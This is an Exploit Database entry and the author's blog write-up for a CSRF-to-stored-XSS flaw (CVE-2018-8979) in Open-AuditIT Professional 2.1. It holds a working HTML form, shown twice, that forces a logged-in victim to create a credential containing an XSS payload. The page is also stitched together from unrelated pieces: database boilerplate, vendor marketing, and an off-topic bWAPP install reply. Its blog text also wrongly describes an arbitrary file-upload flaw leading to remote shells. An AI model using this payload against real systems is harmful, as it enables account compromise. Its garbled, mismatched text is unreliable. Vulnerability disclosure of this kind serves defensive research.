# Exploit Title: Open-AuditIT Professional 2.1 - Cross-Site Request Forgery (CSRF)
# Date: 27-03-2018
# Exploit Author: Nilesh Sapariya
# Contact: https://twitter.com/nilesh_loganx
# Website: https://nileshsapariya.blogspot.com
# Vendor Homepage: https://www.open-audit.org/
# Software Link  : https://www.open-audit.org/downloads.php
# Version: 2.1
# CVE : CVE-2018-8979
# Tested on: Windows 10 Pro
# Category: Webapp Open-AuditIT Professional 2.1

1. Description:-
There is no CSRF protection in Open-AuditIT application, with a little help
of social engineering (like sending a link via email/chat) an attacker may
force the victim to click on a malicious link by which any normal user can
become an Admin user. The attack can force an end user to execute unwanted
actions on a web application in which they're currently authenticated.
Using this vulnerability, we were able to compromise entire user account
with chaining this bug with XSS.

2. Proof of Concept
Login into Open-AuditIT Professional 2.1
Step 1 :- Craft a HTML Page with XSS payload
Step 2:- Save this .html file and send it to victim (Victim  should be
loggedin in the browser)
Crafted value will be added.

Affected Code:
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost/omk/open-audit/credentials"
method="POST">
      <input type="hidden" name="data&#91;attributes&#93;&#91;name&#93;"
value="<img src=x onerror=alert('hacked');>" />
      <input type="hidden"
name="data&#91;attributes&#93;&#91;org&#95;id&#93;" value="1" />
      <input type="hidden"
name="data&#91;attributes&#93;&#91;description&#93;" value="CSRF" />
      <input type="hidden" name="data&#91;attributes&#93;&#91;type&#93;"
value="ssh" />
      <input type="hidden"
name="data&#91;attributes&#93;&#91;credentials&#93;&#91;username&#93;"
value="test" />
      <input type="hidden"
name="data&#91;attributes&#93;&#91;credentials&#93;&#91;password&#93;"
value="test" />
      <input type="hidden" name="data&#91;type&#93;" value="credentials" />
      <input type="hidden" name="submit" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

## Introducing Open-AudIT

Open-AudIT is an application to tell ![](images/icon_4.png) you exactly **what** is on your network, **how** it is configured and **when** it changes. Open-AudIT will run on Windows and Linux systems. Essentially, Open-AudIT is a database of information, that can be queried via a web interface. Data about the network is inserted via a Bash Script (Linux) or VBScript (Windows). The entire application is written in php, bash and vbscript. These are all 'scripting' languages - no compiling and human readable source code. Making changes and customisations is both quick and easy.

Windows PCs can be queried for hardware, software, ![](images/icon_1.png)operating system settings, security settings, ![](images/icon_2.png) IIS settings, services, users & groups and much more. Linux systems can be queried for a similar amount of information. Network devices (printers, switches, routers, etc) can have data recorded such as IP-Address, MAC Address, open ports, serial number, etc, etc. Output is available in PDF, CSV and webpages. There are export options for Dia and Inkscape.

Open-AudIT can be configured to scan your network and devices automatically. A daily scan is recommended for systems, with network scans every couple of hours. ![](images/icon_3.png)That way, you can be assured of being notified if something changes (day to day) on a PC, or even sooner, if something "new" appears on your network.

**Can you really afford not to know what's on your network ?**

### Open-AudIT v5.6.2 released

Hi,

I have never faced such problem while installing bWAPP @localhost. I recommend you to download the fresh setup of bWAPP and use WAMP server.

Follow below steps:
1] Download http://www.wampserver.com/en/
2] After installing wamp server in your windows go to C:\wamp\www and place bWAPP setup.
3] Now type this http://localhost/bWAPP/install.php in url make sure your wampserver is ON

That's it your are good to go, now simply go to http://localhost/bWAPP/login.php and access the bwapp with bee/bug credentials.

I hope this will help you. Let me know if you still facing any problem.

CSRF to XSS - Open-AuditIT Professional 2.1

# CSRF to XSS - Open-AuditIT Professional 2.1

[Bug Bounty](https://nileshsapariya.blogspot.com/search/label/Bug%20Bounty?max-results=5)

Hi All,

Recently in one of my pentest research, I found a Open-AuditIT Professional 2.1.

*Open-AudIT is a network auditing application. It is based on the scripting languages of PHP, Bash and VBScript. Open-AudIT can tell what is on your network, how it is configured and if there have been any changes*

Curious to explore its functionalities, I downloaded and set it up in my local system.

After fiddling with the source code, I found that it did not have any kind of CSRF protection neither Cross site scripting(XSS) Protection and allowed the user to insert any malicious inputs. So I thought to chain this both vulnerability together. i.e. CSRF to XSS.

* **Title of the Vulnerability:**  CSRF to XSS
* **Vulnerability Class:** XSS and CSRF
* **Technical Details & Description:** The application source code is coded in a way which allows arbitrary file extensions to be uploaded. This leads to uploading of remote shells/ malicious Trojans which can lead to complete system compromise and server takeover.
* **CVE ID allocated:**

1. CVE-2018-8903 - Stored XSS
2. CVE-2018-8979 - Cross-Site Request Forgery (CSRF)

* **Product & Service Introduction:** Open-AuditIT Professional 2.1

**Observation:- [ CSRF to XSS]**

When you login into Open-AuditIT Professional 2.1 and Create Credentials [Go to Home ==> Credentials ] you will notice that there is no protection against CSRF.

Digging more deep in source code, I also noticed that they do not have any protection against XSS for Name and Description parameter.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhzoEFCq6D8ub1_-G7Jtddhf30Mawo9XzIP0juqhmk3ZPx0SeI0TiOhGQ7nKxqjz8PVdp11wNDDyAL7EXp3j6HOzzbfHY6iPaVLpF_fUxBO2QAuZ5kNQFf_jUXUh7TF8j0NJho_4PjviiQ/s640/5.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhzoEFCq6D8ub1_-G7Jtddhf30Mawo9XzIP0juqhmk3ZPx0SeI0TiOhGQ7nKxqjz8PVdp11wNDDyAL7EXp3j6HOzzbfHY6iPaVLpF_fUxBO2QAuZ5kNQFf_jUXUh7TF8j0NJho_4PjviiQ/s1600/5.jpg)

**So Next Step was chaining this both bug together .**

**Step 1 :- Craft a HTML Page with XSS payload in it.**

| ```  1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 ``` | ``` <html>   <body>   <script>history.pushState('', '', '/')</script>     <form action="http://localhost/omk/open-audit/credentials" method="POST">       <input type="hidden" name="data&#91;attributes&#93;&#91;name&#93;" value="<img src=x onerror=alert('hacked');>" />       <input type="hidden" name="data&#91;attributes&#93;&#91;org&#95;id&#93;" value="1" />       <input type="hidden" name="data&#91;attributes&#93;&#91;description&#93;" value="CSRF" />       <input type="hidden" name="data&#91;attributes&#93;&#91;type&#93;" value="ssh" />       <input type="hidden" name="data&#91;attributes&#93;&#91;credentials&#93;&#91;username&#93;" value="test" />       <input type="hidden" name="data&#91;attributes&#93;&#91;credentials&#93;&#91;password&#93;" value="test" />       <input type="hidden" name="data&#91;type&#93;" value="credentials" />       <input type="hidden" name="submit" value="" />       <input type="submit" value="Submit request" />     </form>   </body> </html>  ``` |
| --- | --- |

**Step 2:-** Save this .html file and send it to victim
(Victim  should be loggedin in the
browser)

Under Credentials New Entry will be added with your XSS payload.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiN_0jKl97AyuZen3pxtBPfbTXNfVr0S-XiTznazp3uFTsof_wAZgevLGBrrhWl_iLODCnY2yd4ASQnD2_ulPqdkePpjxzeKJtP6w8esQ4dnmku3rXb25umMyB6B1qqv7hlMTBLCyBKiZ8/s640/2018-03-23_111020.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiN_0jKl97AyuZen3pxtBPfbTXNfVr0S-XiTznazp3uFTsof_wAZgevLGBrrhWl_iLODCnY2yd4ASQnD2_ulPqdkePpjxzeKJtP6w8esQ4dnmku3rXb25umMyB6B1qqv7hlMTBLCyBKiZ8/s1600/2018-03-23_111020.jpg)

When any user will visit this page XSS will be triggered :-

http://localhost/omk/open-audit/credentials

**Video POC  for CSRF to XSS :-**

**Conclusion :-**

The main aim of this article is to show that POST based XSS should not be ignored as hard to exploit, but I also hope that it helps to give you ideas of how combining attacks can make them much more potent.
